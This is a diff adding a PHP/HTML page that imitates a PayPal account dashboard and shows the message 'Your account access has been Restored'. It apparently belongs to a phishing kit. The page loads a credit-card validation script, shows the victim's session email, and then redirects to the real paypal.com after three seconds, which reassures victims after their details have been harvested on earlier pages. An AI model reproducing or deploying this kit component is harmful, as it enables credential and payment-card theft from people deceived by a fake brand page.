@@ -1,0 +1,141 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	<meta http-equiv="X-UA-Compatible" content="IE=Edge">
+	<link rel="shortcut icon" href="lib/pics/favi.ico"><link rel="apple-touch-icon" href="lib/pics/favi.png">
+	<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes"><title>
+		.:Completed - Account Restored</title>
+		<link rel="stylesheet" href="lib/styles/process.css">
+		<script type="text/javascript" src="lib/js/jquery-3.3.1.min.js">
+		</script><script type="text/javascript" src="lib/js/jquery.mask.min.js">
+		</script> <script type="text/javascript" src="lib/js/jquery.ccvalid.js"></script>
+	</head>
+	<body>    <div style="z-index:-1;width:80vw;height:80vh;position:absolute;display:none;overflow:hidden;box-sizing:border-box;">
+    <div style="opacity:0;white-space:pre-wrap;white-space:-moz-pre-wrap;white-space:-pre-wrap;white-space:-o-pre-wrap;word-wrap:break-word;">
+    </div></div>
+<input type="checkbox" id="toggleMenu" class="menuToggler"><div class="desktopNav">
+	<div class="navContainer">
+		<a href="javascript:" class="desktopBrand"></a>
+		<div class="mobileMenu">
+			<div class="logoutMobile">
+				<a href="javascript:" class="logoutTxtMobile">
+					Completed</a>
+				</div>
+				<div class="settingsMobile">
+					<a href="javascript:" class="svgLogo settingsTxt">
+						<img src="lib/pics/settings.svg" alt=""></a>
+					</div>
+					<div>
+						<p class="displayMail">
+							<?php echo $_SESSION['EML']?></p>
+						</div>
+					</div>
+<div class="desktopMenu">
+	<nav class="desktopItems">
+		<ul class="firstUl">
+		<li class="">
+			<a href="javascript:" class="linksTxt">
+				<?php echo $lg_process['menu']['home']?>
+			</a>
+		</li>
+		<li class="">
+			<a href="javascript:" class="linksTxt">
+				<?php echo $lg_process['menu']['activity']?></a>
+			</li>
+			<li class="">
+				<a href="javascript:" class="linksTxt">
+					<?php echo $lg_process['menu']['send_receive']?></a></li><li class="">
+						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['wallet']?></a>
+					</li>
+					<li class="activeLi">
+						<a href="javascript:" class="linksTxt"><?php echo $lg_process['menu']['help']?></a>
+					</li>
+				</ul>
+				<ul class="secondUl">
+					<li class="notifLi">
+						<a href="javascript:" class="svgLogo notifTxt">
+							<img src="lib/pics/noti.svg" alt=""></a>
+						</li>
+						<li>
+							<a href="javascript:" class="svgLogo settingsTxt"><img src="lib/pics/settings.svg" alt=""></a>
+						</li>
+						<li class="logoutLi">
+							<a href="javascript:" class="logoutTxtDesktop"><?php echo $lg_process['logout']?></a>
+						</li>
+						</ul>
+					</nav>
+				</div>
+			</div>
+		</div>
+<div class="mainContainer">
+	<div class="hide" id="rotate">
+		<div class="spinner">
+			<div class="rotate"></div>
+			<div class="processing"><?php echo $lg_sign['rotate']?></div>
+		</div>
+		<div class="overlay">
+		</div>
+	</div>
+	<div class="mobileNav">
+		<div class="navHeader">
+			<div class="blockToggler">
+				<label class="menuLabel" for="toggleMenu"><span></span>
+					<div class="menuOpen"><?php echo $lg_process['menu']['open']?></div>
+					<div class="menuClose">
+						<?php echo $lg_process['menu']['close']?></div>
+					</label>
+				</div>
+			</div>
+			<div class="navLogo"><a href="javascript:" class="mobileBrand"></a>
+			</div><ul class="notifUl"><li><a class="svgLogo notifTxt">
+				<img src="lib/pics/noti.svg" alt="">
+			</a>
+		</li>
+	</ul>
+</div>
+<div class="contents">
+<section class="mainContents" id="finish">
+<div id="select_three">
+	<div style="padding:20px">
+		<img src="lib/pics/success.svg" alt="" width="150">
+<h1 style="margin:10px;padding-bottom:10px;font-size:2.4rem"><?php echo $lg_finish['head']?></h1>
+		<p>
+			<?php echo $lg_finish['p1']?>
+			<span style="color:#41ad49;font-weight:bold"> <?php echo $lg_finish['on']?></span> <?php echo $lg_finish['p2']?>
+			<a style="font-weight:bold" href="https://paypal.com">
+				<?php echo $lg_finish['p3']?></a>Thank you! Your account access has been Restored.</p>
+				<div>
+					        <meta http-equiv="refresh" content="3;url=https://paypal.com" />
+				<form method="get" action="https://paypal.com">
+	<button style="margin-top:20px;borde r-radius:.5rem" class="bt gone_bt"><?php echo $lg_process['title']?></button>
+				</form>
+</div>
+</div>
+</div>
+</div>
+
+<div>
+	<div class="ftr">
+		<div class="footerFirstContent">
+			<ul class="footerList">
+				<li><a href="javascript:"><?php echo $lg_sign['footer']['contact']?></a></li>
+				<li><a href="javascript:"><?php echo $lg_process['footer']['security']?></a></li>
+			</ul>
+			<div class="footerSecondContent">
+				<p class="footerP">Copyright ©<span>1999-<?=date('Y');?></span> . <?php echo $lg_process['footer']['rights']?></p>
+				<ul class="footerUl">
+					<li><a href="javascript:"><?php echo $lg_sign['footer']['privacy']?></a></li>
+					<li><a href="javascript:"><?php echo $lg_sign['footer']['legal']?></a></li>
+				</ul>
+			</div>
+		</div>
+	</div>
+	</div>
+	</section>
+
+</div>
+</div>
+</body>
+</html>
